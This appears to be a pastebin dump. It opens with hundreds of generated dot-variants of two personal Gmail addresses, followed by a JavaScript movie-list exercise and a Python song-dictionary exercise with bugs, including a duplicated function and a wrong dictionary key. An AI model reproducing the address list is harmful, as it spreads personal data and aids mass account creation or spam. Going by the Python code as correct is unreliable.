<a href=""mailto:a.b.ubak.ar.muh.d.3.88@gmail.com"">a.b.ubak.ar.muh.d.3.88@gmail.com</a>
<a href=""mailto:abu.b.a.karm.uhd.3.8.8@gmail.com"">abu.b.a.karm.uhd.3.8.8@gmail.com</a>
<a href=""mailto:abu.b.a.k.a.r.m.u.hd3.88@gmail.com"">abu.b.a.k.a.r.m.u.hd3.88@gmail.com</a>
<a href=""mailto:a.b.u.b.a.k.ar.m.u.hd.38.8@gmail.com"">a.b.u.b.a.k.ar.m.u.hd.38.8@gmail.com</a>
<a href=""mailto:ab.u.b.a.ka.rmuhd.3.8.8@gmail.com"">ab.u.b.a.ka.rmuhd.3.8.8@gmail.com</a>
<a href=""mailto:ab.u.ba.k.ar.mu.h.d388@gmail.com"">ab.u.ba.k.ar.mu.h.d388@gmail.com</a>
<a href=""mailto:a.bub.a.karm.uh.d38.8@gmail.com"">a.bub.a.karm.uh.d38.8@gmail.com</a>
<a href=""mailto:abuba.k.a.rm.u.h.d38.8@gmail.com"">abuba.k.a.rm.u.h.d38.8@gmail.com</a>
<a href=""mailto:abub.a.k.ar.muh.d38.8@gmail.com"">abub.a.k.ar.muh.d38.8@gmail.com</a>
<a href=""mailto:abub.a.ka.r.muhd3.88@gmail.com"">abub.a.ka.r.muhd3.88@gmail.com</a>
<a href=""mailto:abuba.karmu.h.d38.8@gmail.com"">abuba.karmu.h.d38.8@gmail.com</a>
<a href=""mailto:abub.a.k.ar.mu.h.d3.8.8@gmail.com"">abub.a.k.ar.mu.h.d3.8.8@gmail.com</a>
<a href=""mailto:ab.ub.ak.ar.m.u.h.d3.88@gmail.com"">ab.ub.ak.ar.m.u.h.d3.88@gmail.com</a>
<a href=""mailto:ab.u.b.a.kar.muh.d388@gmail.com"">ab.u.b.a.kar.muh.d388@gmail.com</a>
<a href=""mailto:abuba.ka.r.muh.d3.88@gmail.com"">abuba.ka.r.muh.d3.88@gmail.com</a>
<a href=""mailto:ab.uba.k.ar.muhd.38.8@gmail.com"">ab.uba.k.ar.muhd.38.8@gmail.com</a>
<a href=""mailto:ab.ubak.ar.m.u.h.d3.8.8@gmail.com"">ab.ubak.ar.m.u.h.d3.8.8@gmail.com</a>
<a href=""mailto:ab.ub.a.kar.m.u.h.d.3.88@gmail.com"">ab.ub.a.kar.m.u.h.d.3.88@gmail.com</a>
<a href=""mailto:ab.ub.a.k.armu.h.d3.88@gmail.com"">ab.ub.a.k.armu.h.d3.88@gmail.com</a>
<a href=""mailto:a.bub.a.karmuhd.38.8@gmail.com"">a.bub.a.karmuhd.38.8@gmail.com</a>
<a href=""mailto:a.bu.b.a.k.armu.hd.38.8@gmail.com"">a.bu.b.a.k.armu.hd.38.8@gmail.com</a>
<a href=""mailto:a.b.u.b.aka.r.mu.h.d.388@gmail.com"">a.b.u.b.aka.r.mu.h.d.388@gmail.com</a>
<a href=""mailto:a.buba.karmu.hd.3.88@gmail.com"">a.buba.karmu.hd.3.88@gmail.com</a>
<a href=""mailto:ab.ubaka.rmuh.d3.88@gmail.com"">ab.ubaka.rmuh.d3.88@gmail.com</a>
<a href=""mailto:abuba.k.ar.mu.hd.38.8@gmail.com"">abuba.k.ar.mu.hd.38.8@gmail.com</a>
<a href=""mailto:abu.b.ak.ar.m.uh.d3.88@gmail.com"">abu.b.ak.ar.m.uh.d3.88@gmail.com</a>
<a href=""mailto:abu.ba.k.armu.h.d.3.8.8@gmail.com"">abu.ba.k.armu.h.d.3.8.8@gmail.com</a>
<a href=""mailto:a.b.u.b.akar.mu.h.d.3.8.8@gmail.com"">a.b.u.b.akar.mu.h.d.3.8.8@gmail.com</a>
<a href=""mailto:a.b.ub.ak.ar.mu.h.d388@gmail.com"">a.b.ub.ak.ar.mu.h.d388@gmail.com</a>
<a href=""mailto:ab.uba.k.a.r.muh.d3.8.8@gmail.com"">ab.uba.k.a.r.muh.d3.8.8@gmail.com</a>
<a href=""mailto:abu.ba.ka.r.mu.hd.3.8.8@gmail.com"">abu.ba.ka.r.mu.hd.3.8.8@gmail.com</a>
<a href=""mailto:ab.u.ba.k.armuhd.388@gmail.com"">ab.u.ba.k.armuhd.388@gmail.com</a>
<a href=""mailto:bankuba196@gmail.com"">bankuba196@gmail.com</a>
<a href=""mailto:b.ank.uba1.96@gmail.com"">b.ank.uba1.96@gmail.com</a>
<a href=""mailto:bankub.a1.9.6@gmail.com"">bankub.a1.9.6@gmail.com</a>
<a href=""mailto:bank.ub.a.1.9.6@gmail.com"">bank.ub.a.1.9.6@gmail.com</a>
<a href=""mailto:banku.ba19.6@gmail.com"">banku.ba19.6@gmail.com</a>
<a href=""mailto:ba.nkub.a1.96@gmail.com"">ba.nkub.a1.96@gmail.com</a>
<a href=""mailto:b.a.nkub.a1.96@gmail.com"">b.a.nkub.a1.96@gmail.com</a>
<a href=""mailto:b.a.n.k.u.ba1.96@gmail.com"">b.a.n.k.u.ba1.96@gmail.com</a>
<a href=""mailto:ba.nk.ub.a1.96@gmail.com"">ba.nk.ub.a1.96@gmail.com</a>
<a href=""mailto:b.ank.u.b.a1.9.6@gmail.com"">b.ank.u.b.a1.9.6@gmail.com</a>
<a href=""mailto:ba.n.k.u.b.a.19.6@gmail.com"">ba.n.k.u.b.a.19.6@gmail.com</a>
<a href=""mailto:ba.nk.u.ba.19.6@gmail.com"">ba.nk.u.ba.19.6@gmail.com</a>
<a href=""mailto:ban.k.u.ba.1.96@gmail.com"">ban.k.u.ba.1.96@gmail.com</a>
<a href=""mailto:ba.n.k.ub.a.19.6@gmail.com"">ba.n.k.ub.a.19.6@gmail.com</a>
<a href=""mailto:b.an.k.uba.19.6@gmail.com"">b.an.k.uba.19.6@gmail.com</a>
<a href=""mailto:bankuba.19.6@gmail.com"">bankuba.19.6@gmail.com</a>
<a href=""mailto:banku.b.a19.6@gmail.com"">banku.b.a19.6@gmail.com</a>
<a href=""mailto:b.an.k.u.b.a19.6@gmail.com"">b.an.k.u.b.a19.6@gmail.com</a>
<a href=""mailto:b.ankuba1.9.6@gmail.com"">b.ankuba1.9.6@gmail.com</a>
<a href=""mailto:b.ankuba1.96@gmail.com"">b.ankuba1.96@gmail.com</a>
<a href=""mailto:b.ank.uba1.9.6@gmail.com"">b.ank.uba1.9.6@gmail.com</a>
<a href=""mailto:b.a.n.k.uba.1.96@gmail.com"">b.a.n.k.uba.1.96@gmail.com</a>
<a href=""mailto:b.a.n.kuba.196@gmail.com"">b.a.n.kuba.196@gmail.com</a>
<a href=""mailto:ba.n.k.ub.a19.6@gmail.com"">ba.n.k.ub.a19.6@gmail.com</a>
<a href=""mailto:ba.n.kuba1.96@gmail.com"">ba.n.kuba1.96@gmail.com</a>
<a href=""mailto:b.ank.u.b.a.196@gmail.com"">b.ank.u.b.a.196@gmail.com</a>
<a href=""mailto:b.an.k.u.ba.1.96@gmail.com"">b.an.k.u.ba.1.96@gmail.com</a>
<a href=""mailto:b.an.k.ub.a196@gmail.com"">b.an.k.ub.a196@gmail.com</a>
<a href=""mailto:b.an.k.u.ba.196@gmail.com"">b.an.k.u.ba.196@gmail.com</a>
<a href=""mailto:b.ank.u.b.a.1.9.6@gmail.com"">b.ank.u.b.a.1.9.6@gmail.com</a>
<a href=""mailto:b.a.nkuba.19.6@gmail.com"">b.a.nkuba.19.6@gmail.com</a>
<a href=""mailto:b.an.kub.a.1.9.6@gmail.com"">b.an.kub.a.1.9.6@gmail.com</a>
<a href=""mailto:b.an.kuba.1.96@gmail.com"">b.an.kuba.1.96@gmail.com</a>
<a href=""mailto:b.ank.u.ba.19.6@gmail.com"">b.ank.u.ba.19.6@gmail.com</a>
<a href=""mailto:ban.ku.b.a.19.6@gmail.com"">ban.ku.b.a.19.6@gmail.com</a>
<a href=""mailto:b.an.k.uba.1.96@gmail.com"">b.an.k.uba.1.96@gmail.com</a>
<a href=""mailto:ba.n.kub.a.1.9.6@gmail.com"">ba.n.kub.a.1.9.6@gmail.com</a>
<a href=""mailto:banku.ba196@gmail.com"">banku.ba196@gmail.com</a>
<a href=""mailto:b.anku.ba196@gmail.com"">b.anku.ba196@gmail.com</a>
<a href=""mailto:b.an.ku.b.a.196@gmail.com"">b.an.ku.b.a.196@gmail.com</a>
<a href=""mailto:banku.b.a1.9.6@gmail.com"">banku.b.a1.9.6@gmail.com</a>
<a href=""mailto:b.a.nk.uba.1.96@gmail.com"">b.a.nk.uba.1.96@gmail.com</a>
<a href=""mailto:b.an.kub.a.1.96@gmail.com"">b.an.kub.a.1.96@gmail.com</a>
<a href=""mailto:ban.kuba.19.6@gmail.com"">ban.kuba.19.6@gmail.com</a>
<a href=""mailto:b.a.n.k.uba1.9.6@gmail.com"">b.a.n.k.uba1.9.6@gmail.com</a>
<a href=""mailto:ba.nkuba1.96@gmail.com"">ba.nkuba1.96@gmail.com</a>
<a href=""mailto:b.a.n.k.uba.19.6@gmail.com"">b.a.n.k.uba.19.6@gmail.com</a>
<a href=""mailto:ba.n.ku.ba1.9.6@gmail.com"">ba.n.ku.ba1.9.6@gmail.com</a>
<a href=""mailto:b.an.ku.ba1.96@gmail.com"">b.an.ku.ba1.96@gmail.com</a>
<a href=""mailto:ba.nk.u.b.a.19.6@gmail.com"">ba.nk.u.b.a.19.6@gmail.com</a>
<a href=""mailto:ban.kuba.1.9.6@gmail.com"">ban.kuba.1.9.6@gmail.com</a>
<a href=""mailto:b.ankuba.19.6@gmail.com"">b.ankuba.19.6@gmail.com</a>
<a href=""mailto:ban.ku.b.a1.9.6@gmail.com"">ban.ku.b.a1.9.6@gmail.com</a>
<a href=""mailto:b.an.k.uba1.9.6@gmail.com"">b.an.k.uba1.9.6@gmail.com</a>
<a href=""mailto:bank.u.ba.196@gmail.com"">bank.u.ba.196@gmail.com</a>
<a href=""mailto:ban.k.u.ba1.9.6@gmail.com"">ban.k.u.ba1.9.6@gmail.com</a>
<a href=""mailto:b.a.n.k.u.b.a1.96@gmail.com"">b.a.n.k.u.b.a1.96@gmail.com</a>
<a href=""mailto:ba.nkub.a.1.96@gmail.com"">ba.nkub.a.1.96@gmail.com</a>
<a href=""mailto:bank.u.b.a1.96@gmail.com"">bank.u.b.a1.96@gmail.com</a>
<a href=""mailto:ban.ku.ba196@gmail.com"">ban.ku.ba196@gmail.com</a>
<a href=""mailto:ba.nkub.a196@gmail.com"">ba.nkub.a196@gmail.com</a>
<a href=""mailto:b.ankuba.1.96@gmail.com"">b.ankuba.1.96@gmail.com</a>
<a href=""mailto:ba.n.kub.a19.6@gmail.com"">ba.n.kub.a19.6@gmail.com</a>
<a href=""mailto:b.a.n.k.u.b.a1.9.6@gmail.com"">b.a.n.k.u.b.a1.9.6@gmail.com</a>
<a href=""mailto:ba.n.k.u.b.a196@gmail.com"">ba.n.k.u.b.a196@gmail.com</a>
<a href=""mailto:ba.nkuba.19.6@gmail.com"">ba.nkuba.19.6@gmail.com</a>
<a href=""mailto:b.ank.ub.a196@gmail.com"">b.ank.ub.a196@gmail.com</a>
<a href=""mailto:b.a.nk.u.b.a.196@gmail.com"">b.a.nk.u.b.a.196@gmail.com</a>
<a href=""mailto:b.an.k.u.ba1.9.6@gmail.com"">b.an.k.u.ba1.9.6@gmail.com</a>
<a href=""mailto:ba.n.k.u.ba19.6@gmail.com"">ba.n.k.u.ba19.6@gmail.com</a>
<a href=""mailto:ba.n.k.u.ba1.9.6@gmail.com"">ba.n.k.u.ba1.9.6@gmail.com</a>
<a href=""mailto:b.a.nk.uba.1.9.6@gmail.com"">b.a.nk.uba.1.9.6@gmail.com</a>
<a href=""mailto:ba.n.k.uba.196@gmail.com"">ba.n.k.uba.196@gmail.com</a>
<a href=""mailto:ban.k.uba19.6@gmail.com"">ban.k.uba19.6@gmail.com</a>
<a href=""mailto:b.a.n.kub.a1.9.6@gmail.com"">b.a.n.kub.a1.9.6@gmail.com</a>
<a href=""mailto:ba.nkub.a.1.9.6@gmail.com"">ba.nkub.a.1.9.6@gmail.com</a>
<a href=""mailto:b.a.nk.ub.a.196@gmail.com"">b.a.nk.ub.a.196@gmail.com</a>
<a href=""mailto:b.ankuba19.6@gmail.com"">b.ankuba19.6@gmail.com</a>
<a href=""mailto:ba.nkuba196@gmail.com"">ba.nkuba196@gmail.com</a>
<a href=""mailto:ba.nk.u.ba.1.96@gmail.com"">ba.nk.u.ba.1.96@gmail.com</a>
<a href=""mailto:ban.ku.b.a1.96@gmail.com"">ban.ku.b.a1.96@gmail.com</a>
<a href=""mailto:b.ank.u.ba1.96@gmail.com"">b.ank.u.ba1.96@gmail.com</a>
<a href=""mailto:b.a.nk.u.b.a196@gmail.com"">b.a.nk.u.b.a196@gmail.com</a>
<a href=""mailto:b.a.nk.uba.19.6@gmail.com"">b.a.nk.uba.19.6@gmail.com</a>
<a href=""mailto:ba.n.ku.ba.1.96@gmail.com"">ba.n.ku.ba.1.96@gmail.com</a>
<a href=""mailto:b.a.nk.u.b.a.19.6@gmail.com"">b.a.nk.u.b.a.19.6@gmail.com</a>
<a href=""mailto:b.a.nk.u.b.a1.9.6@gmail.com"">b.a.nk.u.b.a1.9.6@gmail.com</a>
<a href=""mailto:bankuba.196@gmail.com"">bankuba.196@gmail.com</a>
<a href=""mailto:bank.u.ba1.96@gmail.com"">bank.u.ba1.96@gmail.com</a>
<a href=""mailto:b.ankuba.1.9.6@gmail.com"">b.ankuba.1.9.6@gmail.com</a>
<a href=""mailto:b.anku.b.a1.9.6@gmail.com"">b.anku.b.a1.9.6@gmail.com</a>
<a href=""mailto:b.a.nku.ba19.6@gmail.com"">b.a.nku.ba19.6@gmail.com</a>
<a href=""mailto:ba.nku.ba.1.9.6@gmail.com"">ba.nku.ba.1.9.6@gmail.com</a>
<a href=""mailto:b.a.nku.b.a.1.96@gmail.com"">b.a.nku.b.a.1.96@gmail.com</a>
<a href=""mailto:bank.u.b.a19.6@gmail.com"">bank.u.b.a19.6@gmail.com</a>
<a href=""mailto:ba.n.k.uba.1.96@gmail.com"">ba.n.k.uba.1.96@gmail.com</a>
<a href=""mailto:ban.kuba19.6@gmail.com"">ban.kuba19.6@gmail.com</a>
<a href=""mailto:ba.nkuba.1.96@gmail.com"">ba.nkuba.1.96@gmail.com</a>
<a href=""mailto:ba.n.k.u.b.a19.6@gmail.com"">ba.n.k.u.b.a19.6@gmail.com</a>
<a href=""mailto:b.anku.ba1.9.6@gmail.com"">b.anku.ba1.9.6@gmail.com</a>
<a href=""mailto:banku.ba.19.6@gmail.com"">banku.ba.19.6@gmail.com</a>
<a href=""mailto:b.a.nk.u.ba.1.96@gmail.com"">b.a.nk.u.ba.1.96@gmail.com</a>
<a href=""mailto:ba.n.ku.ba1.96@gmail.com"">ba.n.ku.ba1.96@gmail.com</a>
<a href=""mailto:b.a.n.ku.ba.1.96@gmail.com"">b.a.n.ku.ba.1.96@gmail.com</a>
<a href=""mailto:b.a.nk.ub.a.19.6@gmail.com"">b.a.nk.ub.a.19.6@gmail.com</a>
<a href=""mailto:bank.uba196@gmail.com"">bank.uba196@gmail.com</a>
<a href=""mailto:ban.ku.ba1.9.6@gmail.com"">ban.ku.ba1.9.6@gmail.com</a>
<a href=""mailto:ba.n.k.uba1.9.6@gmail.com"">ba.n.k.uba1.9.6@gmail.com</a>
<a href=""mailto:b.a.nku.ba.1.96@gmail.com"">b.a.nku.ba.1.96@gmail.com</a>
<a href=""mailto:b.an.k.u.b.a.19.6@gmail.com"">b.an.k.u.b.a.19.6@gmail.com</a>
<a href=""mailto:ban.ku.ba.19.6@gmail.com"">ban.ku.ba.19.6@gmail.com</a>
<a href=""mailto:ban.k.u.ba.19.6@gmail.com"">ban.k.u.ba.19.6@gmail.com</a>
<a href=""mailto:bank.u.ba19.6@gmail.com"">bank.u.ba19.6@gmail.com</a>
<a href=""mailto:b.an.kub.a.196@gmail.com"">b.an.kub.a.196@gmail.com</a>
<a href=""mailto:ba.n.k.u.b.a1.9.6@gmail.com"">ba.n.k.u.b.a1.9.6@gmail.com</a>
<a href=""mailto:b.ank.u.ba.196@gmail.com"">b.ank.u.ba.196@gmail.com</a>
<a href=""mailto:b.a.n.ku.ba196@gmail.com"">b.a.n.ku.ba196@gmail.com</a>
<a href=""mailto:b.a.n.k.u.b.a19.6@gmail.com"">b.a.n.k.u.b.a19.6@gmail.com</a>
<a href=""mailto:ba.nkuba.196@gmail.com"">ba.nkuba.196@gmail.com</a>
<a href=""mailto:b.an.k.u.b.a1.96@gmail.com"">b.an.k.u.b.a1.96@gmail.com</a>
<a href=""mailto:ban.kuba1.9.6@gmail.com"">ban.kuba1.9.6@gmail.com</a>
<a href=""mailto:ban.k.u.b.a1.9.6@gmail.com"">ban.k.u.b.a1.9.6@gmail.com</a>
<a href=""mailto:b.ank.uba.1.9.6@gmail.com"">b.ank.uba.1.9.6@gmail.com</a>
<a href=""mailto:b.a.nk.uba.196@gmail.com"">b.a.nk.uba.196@gmail.com</a>
<a href=""mailto:ba.n.ku.b.a1.9.6@gmail.com"">ba.n.ku.b.a1.9.6@gmail.com</a>
<a href=""mailto:ba.n.kub.a1.9.6@gmail.com"">ba.n.kub.a1.9.6@gmail.com</a>
<a href=""mailto:ba.nkuba.1.9.6@gmail.com"">ba.nkuba.1.9.6@gmail.com</a>
<a href=""mailto:b.an.k.ub.a1.9.6@gmail.com"">b.an.k.ub.a1.9.6@gmail.com</a>
<a href=""mailto:b.an.ku.ba.196@gmail.com"">b.an.ku.ba.196@gmail.com</a>
<a href=""mailto:ba.n.k.uba196@gmail.com"">ba.n.k.uba196@gmail.com</a>
<a href=""mailto:bankuba.1.9.6@gmail.com"">bankuba.1.9.6@gmail.com</a>
<a href=""mailto:ba.n.kub.a.1.96@gmail.com"">ba.n.kub.a.1.96@gmail.com</a>
<a href=""mailto:b.a.n.k.ub.a.1.96@gmail.com"">b.a.n.k.ub.a.1.96@gmail.com</a>
<a href=""mailto:b.an.k.ub.a19.6@gmail.com"">b.an.k.ub.a19.6@gmail.com</a>
<a href=""mailto:b.ank.u.b.a19.6@gmail.com"">b.ank.u.b.a19.6@gmail.com</a>
<a href=""mailto:bank.u.ba.1.96@gmail.com"">bank.u.ba.1.96@gmail.com</a>
<a href=""mailto:b.an.ku.b.a.1.9.6@gmail.com"">b.an.ku.b.a.1.9.6@gmail.com</a>
<a href=""mailto:ban.k.uba1.9.6@gmail.com"">ban.k.uba1.9.6@gmail.com</a>
<a href=""mailto:b.an.k.u.ba1.96@gmail.com"">b.an.k.u.ba1.96@gmail.com</a>
<a href=""mailto:ba.nk.uba.1.96@gmail.com"">ba.nk.uba.1.96@gmail.com</a>
<a href=""mailto:ban.k.ub.a.196@gmail.com"">ban.k.ub.a.196@gmail.com</a>
<a href=""mailto:ba.n.k.u.b.a.1.9.6@gmail.com"">ba.n.k.u.b.a.1.9.6@gmail.com</a>
<a href=""mailto:ban.k.u.b.a.1.9.6@gmail.com"">ban.k.u.b.a.1.9.6@gmail.com</a>
<a href=""mailto:ban.ku.ba19.6@gmail.com"">ban.ku.ba19.6@gmail.com</a>
<a href=""mailto:b.ankub.a.1.9.6@gmail.com"">b.ankub.a.1.9.6@gmail.com</a>
<a href=""mailto:ba.n.kuba.1.9.6@gmail.com"">ba.n.kuba.1.9.6@gmail.com</a>
<a href=""mailto:b.a.nku.ba.196@gmail.com"">b.a.nku.ba.196@gmail.com</a>
<a href=""mailto:b.an.ku.b.a.1.96@gmail.com"">b.an.ku.b.a.1.96@gmail.com</a>
<a href=""mailto:bank.uba.1.96@gmail.com"">bank.uba.1.96@gmail.com</a>
<a href=""mailto:ban.k.u.ba1.96@gmail.com"">ban.k.u.ba1.96@gmail.com</a>
<a href=""mailto:ba.nk.ub.a.1.96@gmail.com"">ba.nk.ub.a.1.96@gmail.com</a>
<a href=""mailto:b.an.k.u.b.a.1.9.6@gmail.com"">b.an.k.u.b.a.1.9.6@gmail.com</a>
<a href=""mailto:b.a.n.ku.b.a1.9.6@gmail.com"">b.a.n.ku.b.a1.9.6@gmail.com</a>
<a href=""mailto:b.ank.uba.196@gmail.com"">b.ank.uba.196@gmail.com</a>
<a href=""mailto:ba.nk.u.b.a1.96@gmail.com"">ba.nk.u.b.a1.96@gmail.com</a>
<a href=""mailto:ba.nku.ba.19.6@gmail.com"">ba.nku.ba.19.6@gmail.com</a>
<a href=""mailto:b.a.n.kub.a19.6@gmail.com"">b.a.n.kub.a19.6@gmail.com</a>
<a href=""mailto:b.a.nkub.a.1.96@gmail.com"">b.a.nkub.a.1.96@gmail.com</a>
<a href=""mailto:b.ank.uba.19.6@gmail.com"">b.ank.uba.19.6@gmail.com</a>
<a href=""mailto:banku.ba1.9.6@gmail.com"">banku.ba1.9.6@gmail.com</a>
<a href=""mailto:banku.ba.1.96@gmail.com"">banku.ba.1.96@gmail.com</a>
<a href=""mailto:ba.n.kub.a.196@gmail.com"">ba.n.kub.a.196@gmail.com</a>
<a href=""mailto:b.a.nk.ub.a.1.9.6@gmail.com"">b.a.nk.ub.a.1.9.6@gmail.com</a>
<a href=""mailto:b.a.nk.u.b.a19.6@gmail.com"">b.a.nk.u.b.a19.6@gmail.com</a>
<a href=""mailto:ba.nk.u.b.a1.9.6@gmail.com"">ba.nk.u.b.a1.9.6@gmail.com</a>
<a href=""mailto:ba.n.k.ub.a.1.9.6@gmail.com"">ba.n.k.ub.a.1.9.6@gmail.com</a>
<a href=""mailto:ba.nk.u.ba1.9.6@gmail.com"">ba.nk.u.ba1.9.6@gmail.com</a>
<a href=""mailto:b.ank.u.b.a196@gmail.com"">b.ank.u.b.a196@gmail.com</a>
<a href=""mailto:ba.n.kuba1.9.6@gmail.com"">ba.n.kuba1.9.6@gmail.com</a>
<a href=""mailto:ban.k.uba1.96@gmail.com"">ban.k.uba1.96@gmail.com</a>
<a href=""mailto:ba.n.ku.b.a.1.9.6@gmail.com"">ba.n.ku.b.a.1.9.6@gmail.com</a>
<a href=""mailto:b.an.k.uba1.96@gmail.com"">b.an.k.uba1.96@gmail.com</a>
<a href=""mailto:b.an.k.u.b.a.196@gmail.com"">b.an.k.u.b.a.196@gmail.com</a>
<a href=""mailto:b.anku.ba.1.96@gmail.com"">b.anku.ba.1.96@gmail.com</a>
<a href=""mailto:b.anku.b.a.1.96@gmail.com"">b.anku.b.a.1.96@gmail.com</a>
<a href=""mailto:b.an.kuba.1.9.6@gmail.com"">b.an.kuba.1.9.6@gmail.com</a>
<a href=""mailto:b.a.n.ku.b.a.19.6@gmail.com"">b.a.n.ku.b.a.19.6@gmail.com</a>
<a href=""mailto:b.a.n.ku.b.a.1.9.6@gmail.com"">b.a.n.ku.b.a.1.9.6@gmail.com</a>
<a href=""mailto:b.ank.uba.1.96@gmail.com"">b.ank.uba.1.96@gmail.com</a>
<a href=""mailto:b.ankub.a19.6@gmail.com"">b.ankub.a19.6@gmail.com</a>
<a href=""mailto:banku.b.a.196@gmail.com"">banku.b.a.196@gmail.com</a>
<a href=""mailto:bankub.a196@gmail.com"">bankub.a196@gmail.com</a>
<a href=""mailto:b.an.kuba1.96@gmail.com"">b.an.kuba1.96@gmail.com</a>
<a href=""mailto:ba.n.kuba196@gmail.com"">ba.n.kuba196@gmail.com</a>
<a href=""mailto:b.an.kub.a.19.6@gmail.com"">b.an.kub.a.19.6@gmail.com</a>
<a href=""mailto:b.ankub.a1.96@gmail.com"">b.ankub.a1.96@gmail.com</a>
<a href=""mailto:b.ank.ub.a.1.96@gmail.com"">b.ank.ub.a.1.96@gmail.com</a>
<a href=""mailto:bank.u.b.a.19.6@gmail.com"">bank.u.b.a.19.6@gmail.com</a>
<a href=""mailto:ba.nku.ba.1.96@gmail.com"">ba.nku.ba.1.96@gmail.com</a>
<a href=""mailto:ba.nk.ub.a.1.9.6@gmail.com"">ba.nk.ub.a.1.9.6@gmail.com</a>
<a href=""mailto:b.ank.uba196@gmail.com"">b.ank.uba196@gmail.com</a>
<a href=""mailto:ban.kub.a.1.9.6@gmail.com"">ban.kub.a.1.9.6@gmail.com</a>
<a href=""mailto:b.an.k.u.b.a.1.96@gmail.com"">b.an.k.u.b.a.1.96@gmail.com</a>
<a href=""mailto:ban.k.uba.1.96@gmail.com"">ban.k.uba.1.96@gmail.com</a>
<a href=""mailto:bank.ub.a196@gmail.com"">bank.ub.a196@gmail.com</a>
<a href=""mailto:ba.nk.u.ba.1.9.6@gmail.com"">ba.nk.u.ba.1.9.6@gmail.com</a>
<a href=""mailto:b.a.n.k.ub.a19.6@gmail.com"">b.a.n.k.ub.a19.6@gmail.com</a>
<a href=""mailto:ba.nk.u.ba196@gmail.com"">ba.nk.u.ba196@gmail.com</a>
<a href=""mailto:b.a.n.kub.a.19.6@gmail.com"">b.a.n.kub.a.19.6@gmail.com</a>
<a href=""mailto:b.a.n.k.ub.a1.9.6@gmail.com"">b.a.n.k.ub.a1.9.6@gmail.com</a>
<a href=""mailto:banku.b.a.1.96@gmail.com"">banku.b.a.1.96@gmail.com</a>"
e49Uh1Gh,Untitled,differen71,JavaScript,Thursday 23rd of November 2023 01:50:38 PM CDT,"function movieInfo(dataArray) {
    let moviesLibrary = [];

    function addMovie(movieName) {
        let movieObject = { name: movieName };
        moviesLibrary.push(movieObject);
    }

    function addDirector(movie, director) {
        let searchedMovie = moviesLibrary.find((movieObject) => movieObject.name === movie);
        if (searchedMovie) {
            searchedMovie['director'] = director;
        };
    }

    function addDate(movie, date) {
        let searchedMovie = moviesLibrary.find((movieObject) => movieObject.name === movie);
        if (searchedMovie) {
            searchedMovie['date'] = date;
        };
    }

    dataArray.forEach(element => {
        if (element.includes('addMovie')) {
            let movieName = element.split('addMovie ')[1];
            addMovie(movieName);

        } else if (element.includes('directedBy')) {
            let [movieName, directorName] = element.split("" directedBy "");
            addDirector(movieName, directorName);
        }

        else if (element.includes('onDate')) {
            let [movieName, movieDate] = element.split("" onDate "");
            addDate(movieName, movieDate);
        }
    });

    for (const movie of moviesLibrary) {
        if (movie.name && movie.director && movie.date)
            console.log(JSON.stringify(movie))
    }
}"
mXSJKzBn,Basic Shit,IMustRemainUnknown,Python,Thursday 23rd of November 2023 01:30:28 PM CDT,"song_dictionary = {
    'song1': {'title': 'Bad Day',
              'artist': 'Daniel Powter',
              'album': ['Daniel Powter'],
              'release_date': 2005,
              'genre': ['Pop'],
              'duration': 235,
              'producer': 'Mitchell Froom, Jeff Dawson',
              'songwriter': 'Daniel Powter'}
}


def add_song(song_title, song_artist, album, release_date, genre, duration, producer, songwriter):
    dict_count = len(song_dictionary) + 1
    song_dictionary['song' + str(dict_count)] = {'title': song_title,
                                                 'artist': song_artist,
                                                 'album': [album],
                                                 'release_date': release_date,
                                                 'genre': [genre],
                                                 'duration': duration,
                                                 'producer': producer,
                                                 'songwriter': songwriter}


def print_all_unique_genre():
    # Extracting unique genres
    unique_genres = set()
    for movie_info in song_dictionary.values():
        unique_genres.update(movie_info.get('genre', []))

    # Printing unique genres
    print('Unique Genres:', unique_genres)


def print_all_unique_albums():
    # Extracting unique genres
    unique_albums = set()
    for movie_info in song_dictionary.values():
        unique_albums.update(movie_info.get('album', []))

    # Printing unique genres
    print('Unique Albums:', unique_albums)


def print_album_songs():
    # Extracting unique genres
    unique_genres = set()
    for movie_info in song_dictionary.values():
        unique_genres.update(movie_info.get('genres', []))

    # Printing unique genres
    print('Unique Genres:', unique_genres)


def print_title_artist_date():
    for song_id, song_info in song_dictionary.items():
        title = song_info['title']
        artist = song_info['artist']
        release_date = song_info['release_date']
        print(f""{title}\t{artist}\t{release_date}"")


def print_song_released_after_2010():
    # Print song titles released after the year 2010
    for song_id, song_info in song_dictionary.items():
        title = song_info['title']
        release_date = song_info['release_date']

        # Check if the release year is known and greater than 2010
        if release_date > 2010:
            print(f""{title} (Released in {release_date})"")


def print_pop_songs():
    # Print song titles that are Pop songs
    for song_id, song_info in song_dictionary.items():
        title = song_info['title']
        genres = song_info['genre']

        # Check if 'Pop' is in the list of genres
        if 'Pop' in genres:
            print(title)


def print_genre(target_genre):

    print('Songs under ' + target_genre + ' genre:')

    for song_id, song_info in song_dictionary.items():
        title = song_info['title']
        genres = song_info['genre']

        # Check if the target_genre is in the list of genres
        if target_genre in genres:
            print(title)


def print_highest_duration():
    max_duration_song = max(song_dictionary.values(), key=lambda x: x['duration'])
    print(f""Title: {max_duration_song['title']}"")
    print(f""Duration: {max_duration_song['duration']} seconds"")


def print_lover_songs():
    # Print songs that belong to the album ""Lover""
    for song_id, song_info in song_dictionary.items():
        if 'Lover' in song_info['album']:
            print(song_info['title'])


def print_album_songs(target_album):
    album_songs = []
    for song_id, song_info in song_dictionary.items():
        if target_album in song_info['album']:
            album_songs.append(song_info['title'])

    print(album_songs)


def print_all_unique_albums_songs():
    # Create a dictionary to store songs by album
    songs_by_album = {}

    # Group songs by album
    for song_id, song_info in song_dictionary.items():
        for album in song_info['album']:
            if album not in songs_by_album:
                songs_by_album[album] = []
            songs_by_album[album].append(song_info['title'])

    # Print songs by album
    for album, songs in songs_by_album.items():
        print(f""{album} {songs}"")


add_song('Adore You', 'Harry Styles', 'Fine Line', 2019, 'Funk, Disco, Pop Rock', 207, 'Kid Harpoon', 'Harry Styles, Amy Allen, Tyl Johnson, Kid Harpoon')
add_song('A Thousand Miles', 'Vanessa Cariton', 'Be Not Nobody', 2002, 'Pop', 240, 'Ron Fair, Curtis Schweitzer', 'Vanessa Cariton')
add_song('Lover', 'Taylor Swift', 'Lover', 2019, 'Country, Indie Folk, Alternative Country', 221, 'Taylor Swift, Jack Antonoff', 'Taylor Swift')
add_song('Cornelia', 'Taylor Swift', 'Lover', 2019, 'Electropop',287, 'Taylor Swift, Jack Antonoff', 'Taylor Swift')

print('---------------UNIQUE GENRES---------------')
print_all_unique_genre()

print()
print('---------------UNIQUE ALBUMS---------------')
print_all_unique_albums()

print()
